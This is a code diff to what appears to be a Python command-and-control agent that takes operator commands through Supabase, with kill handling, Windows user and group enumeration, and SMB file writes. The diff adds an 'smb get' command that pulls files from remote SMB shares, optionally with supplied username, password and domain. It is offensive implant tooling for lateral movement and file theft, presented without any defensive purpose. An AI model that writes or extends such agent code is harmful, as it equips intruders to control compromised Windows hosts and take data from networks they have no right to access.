@@ -9,6 +9,7 @@ from .config import SUPABASE_KEY
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi import wls, wami, list_users_in_group, smb_write
+    from utils.winapi.smb_get import smb_get  # Ensure correct import
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -127,6 +128,28 @@ def execute_commands(supabase: Client):
                             result = smb_write(local_file_path, remote_smb_path, username, password, domain)
                         else:
                             result = smb_write(local_file_path, remote_smb_path)
+                        status = 'Completed'
+                        output = result
+                    except Exception as e:
+                        status = 'Failed'
+                        output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
+
+            # Handle 'smb get <remote_file_path> <local_file_path> [username password domain]' command only if on Windows
+            elif os.name == 'nt' and command_text.lower().startswith('smb get '):
+                parts = command_text.split(' ')
+                if len(parts) < 3:
+                    status = 'Failed'
+                    output = "Invalid smb get command format. Use 'smb get <remote_file_path> <local_file_path> [username password domain]'."
+                else:
+                    try:
+                        remote_file_path = parts[2]
+                        local_file_path = parts[3]
+                        if len(parts) == 7:
+                            username, password, domain = parts[4], parts[5], parts[6]
+                            result = smb_get(remote_file_path, local_file_path, username, password, domain)
+                        else:
+                            result = smb_get(remote_file_path, local_file_path)
                         status = 'Completed'
                         output = result
                     except Exception as e:
